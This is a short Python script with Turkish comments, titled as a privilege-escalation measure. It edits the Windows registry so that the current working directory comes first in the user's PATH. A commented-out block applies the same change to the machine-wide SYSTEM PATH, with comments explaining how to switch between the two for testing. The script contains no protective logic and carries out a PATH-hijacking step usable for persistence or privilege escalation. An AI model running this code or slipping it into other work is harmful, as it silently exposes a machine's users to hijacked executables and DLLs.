# Privilege escalation önlemi

import os, winreg
from shutil import register_unpack_format

def readPathValue(reghive, regpath):
    reg = winreg.ConnectRegistry(None, reghive)
    key = winreg.OpenKey(reg, regpath, access=winreg.KEY_READ)
    index = 0

    while True:
        val = winreg.EnumValue(key, index)
        if val[0] == "Path":
            return val[1]
        index += 1

def editPathValue(reghive, regpath, targetdir):
    path = readPathValue(reghive, regpath)
    newpath = targetdir + ";" + path
    reg = winreg.ConnectRegistry(None, reghive)
    key = winreg.OpenKey(reg, regpath, access=winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "Path", 0, winreg.REG_EXPAND_SZ, newpath)

try:
    # Modify user path
    reghive = winreg.HKEY_CURRENT_USER #denemek için bunları yoruma al
    regpath = "Environment" #denemek için bunları yoruma al
    targetdir = os.getcwd() 

    editPathValue(reghive, regpath, targetdir)#denemek için bunları yoruma al

    # Modify SYSTEM path
    # reghive = winreg.HKEY_LOCAL_MACHINE #denemek için bunları yorumdan çıkar
    # regpath = "SYSTEM\CurrentControlSet\Control\Session Manager\Environment"  #denemek için bunları yorumdan çıkar
    # editPathValue(reghive, regpath, targetdir) #denemek için bunları yorumdan çıkar
except PermissionError:
    print("Calm down honey.")
